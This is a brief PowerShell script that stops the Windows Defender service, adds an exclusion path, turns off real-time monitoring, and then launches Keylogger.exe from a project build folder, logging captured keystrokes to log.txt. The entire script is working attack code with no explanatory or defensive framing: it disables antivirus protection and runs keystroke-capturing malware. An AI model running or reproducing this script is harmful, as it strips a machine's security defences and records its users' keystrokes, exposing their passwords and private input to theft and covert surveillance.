$l = $args[0]
sc stop WinDefend
Set-MpPreference -ExclusionPath $l
Set-MpPreference -DisableRealtimeMonitoring $true
"{0}KeystrokeAPI\Keystroke.ConsoleAppTest\bin\Release" -f $l | cd
$f = "{0}log.txt" -f $l
.\Keylogger.exe $f

